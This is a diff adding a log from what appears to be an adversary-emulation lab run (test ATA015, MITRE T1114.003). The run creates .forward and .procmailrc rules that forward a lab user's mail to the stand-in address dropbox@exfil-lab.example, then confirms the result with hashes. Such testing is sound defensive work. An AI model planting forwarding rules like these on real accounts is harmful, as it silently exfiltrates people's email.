@@ -1,0 +1,16 @@
+ATA015 ?? T1114.003 Email Forwarding Rule (crear .forward/.procmailrc) ??? custom (manual)
+T0=2026-09-29T00:46:13Z
+/home/angel/lab-legit/.forward:2:dropbox@exfil-lab.example
+/home/angel/lab-legit/.procmailrc:4:! dropbox@exfil-lab.example
+--- estado final ---
+-rw-rw-r-- 1 angel angel   96 Sep 29 02:46 /home/angel/lab-legit/.forward
+-rw-rw-r-- 1 angel angel  123 Sep 29 02:46 /home/angel/lab-legit/.procmailrc
+
+/home/angel/lab-attack/ATA015/collected/:
+total 8
+-rw-rw-r-- 1 angel angel  96 Sep 29 02:46 forward
+-rw-rw-r-- 1 angel angel 123 Sep 29 02:46 procmailrc
+sha256 .forward origen = 7afb588c1e936d68ca3b1668608a0703f7d9bf898adc93882e8f5c2e449e9d65
+sha256 copia          = 7afb588c1e936d68ca3b1668608a0703f7d9bf898adc93882e8f5c2e449e9d65
+REENVIO=OK (regla de reenvio creada; destino dropbox@exfil-lab.example)
+T1_LOCAL=2026-09-29T00:46:15Z
